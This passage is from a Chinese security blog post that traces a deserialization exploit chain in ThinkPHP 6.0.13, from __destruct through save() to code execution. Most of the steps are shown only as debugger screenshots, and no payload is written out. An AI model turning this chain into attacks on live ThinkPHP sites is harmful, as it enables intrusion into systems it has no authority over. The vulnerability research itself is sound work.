+<p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021170119781.png" alt="image-20221021170119781"></p>
+<p>根据poc可以看到漏洞代码出现在</p>
+<p><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021161431399.png" alt="image-20221021161431399"></p>
+<p>这种框架向上回溯太麻烦了，采用poc+动态debug进行分析，基于之前的thinkphp框架复习，我们在vuln方法中加入漏洞代码，并在反序列化处打上断点，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021170414934.png" alt="image-20221021170414934"></p>
+<p>此处是反序列化入口__destruct()，如下图<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221022110935817.png" alt="image-20221022110935817"></p>
+<p>一步一步跟进，跟进到下图所示的语句，可以看到此时autosave值为false，进入save()<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021163201653.png" alt="image-20221021163201653"></p>
+<p>继续跟踪，最终跟到触达代码执行的地方<br><img src="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20221021174538053.png" alt="image-20221021174538053"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">ybdt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">http://example.com/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/" title="JPress审计"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">JPress审计</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/" title="悟空CRM审计"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-19</div><div class="title">悟空CRM审计</div></div></a></div><div><a href="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/" title="JPress审计"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-22</div><div class="title">JPress审计</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ybdt</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ybdt"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">要想练就绝世武功，就要忍受常人难忍受的痛</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-ThinkPHP%E7%89%88%E6%9C%AC%E6%A2%B3%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">0x01 ThinkPHP版本梳理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Mac%E4%B8%8BPHP%E9%9B%86%E6%88%90%E7%8E%AF%E5%A2%83%E8%B8%A9%E5%9D%91"><span class="toc-number">2.</span> <span class="toc-text">0x02 Mac下PHP集成环境踩坑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Mac%E4%B8%8BThinkPHP%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E8%B8%A9%E5%9D%91"><span class="toc-number">3.</span> <span class="toc-text">0x03 Mac下ThinkPHP调试环境踩坑</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8APOP%E9%93%BE%E5%A4%8D%E4%B9%A0"><span class="toc-number">4.</span> <span class="toc-text">0x04 PHP反序列化漏洞及POP链复习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-ThinkPHP%E6%A1%86%E6%9E%B6%E5%A4%8D%E4%B9%A0"><span class="toc-number">5.</span> <span class="toc-text">0x05 ThinkPHP框架复习</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">6.</span> <span class="toc-text">0x06 ThinkPHP最新版6.0.13 0day利用链分析</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/22/ThinkPHP%E6%9C%80%E6%96%B0%E7%89%886-0-13-0day%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" title="ThinkPHP最新版6-0-13-0day利用链分析">ThinkPHP最新版6-0-13-0day利用链分析</a><time datetime="2024-04-22T11:53:08.000Z" title="Created 2024-04-22 19:53:08">2024-04-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/22/JPress%E5%AE%A1%E8%AE%A1/" title="JPress审计">JPress审计</a><time datetime="2024-04-22T11:28:19.000Z" title="Created 2024-04-22 19:28:19">2024-04-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/19/%E6%82%9F%E7%A9%BACRM%E5%AE%A1%E8%AE%A1/" title="悟空CRM审计">悟空CRM审计</a><time datetime="2024-04-19T01:17:45.000Z" title="Created 2024-04-19 09:17:45">2024-04-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/03/%E8%A7%A3%E5%86%B3Windows-Defender%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%88%E8%87%AA%E5%8A%A8%E6%89%93%E5%BC%80%E7%9A%84%E5%9B%B0%E6%89%B0/" title="解决Windows Defender关闭后又自动打开的困扰（隐蔽的关闭杀软方式？）">解决Windows Defender关闭后又自动打开的困扰（隐蔽的关闭杀软方式？）</a><time datetime="2024-02-03T02:56:48.000Z" title="Created 2024-02-03 10:56:48">2024-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/01/11/%E6%96%B0%E5%BE%81%E7%A8%8B/" title="新征程">新征程</a><time datetime="2022-01-11T11:34:25.000Z" title="Created 2022-01-11 19:34:25">2022-01-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By ybdt</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
